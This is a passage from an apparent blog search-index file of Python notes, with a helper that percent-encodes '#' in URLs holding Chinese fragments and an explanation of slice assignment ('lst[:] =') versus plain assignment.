title="处理url中的sharp"></a>处理url中的sharp</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 处理url中的#号</span><br><span class="line"># 把#(sharp)转为%23</span><br><span class="line">def sharp_fix(url):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    the sharp (#) will incur some troubles in url</span><br><span class="line">    param: url</span><br><span class="line"></span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if url.find(&#39;#&#39;) &gt;&#x3D; 0:</span><br><span class="line">        strs &#x3D; url.split(&#39;#&#39;)</span><br><span class="line">        if is_chinese(strs[1]):</span><br><span class="line">            fix &#x3D; urllib.parse.quote(strs[1])</span><br><span class="line">            fix &#x3D; strs[0] + &#39;%23&#39; + fix</span><br><span class="line">            return fix</span><br><span class="line">        return url</span><br><span class="line">    return url</span><br></pre></td></tr></table></figure><h2 id="List篇"><a href="#List篇" class="headerlink" title="List篇"></a>List篇</h2></li><li><h4 id="："><a href="#：" class="headerlink" title="[：]"></a>[：]</h4><p><a href="https://stackoverflow.com/questions/32448414/what-does-colon-at-assignment-for-list-do-in-python/32448477#32448477" target="_blank" rel="noopener">Reference</a></p><p>[:]=与直接赋值(=)的区别</p><p>A slice of <code>[:]</code> means the entire list. And, <code>[:]=</code>is quite different from <code>=</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>original = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>other = original</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>original[:] = [<span class="number">0</span>, <span class="number">0</span>] <span class="comment"># changes the contents of the list that both</span></span><br><span class="line">                         <span class="comment"># original and other refer to </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>other <span class="comment"># see below, now you can see the change through other</span></span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>original = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>other = original</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>original = [<span class="number">0</span>, <span class="number">0</span>] <span class="comment"># original now refers to a different list than other</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>other <span class="comment"># other remains the same</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><p> <code>lst[:]</code> not followed by an <code>=</code> calls <code>__getitem__</code>, while <code>lst[:] =</code> calls <code>__setitem__</code></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
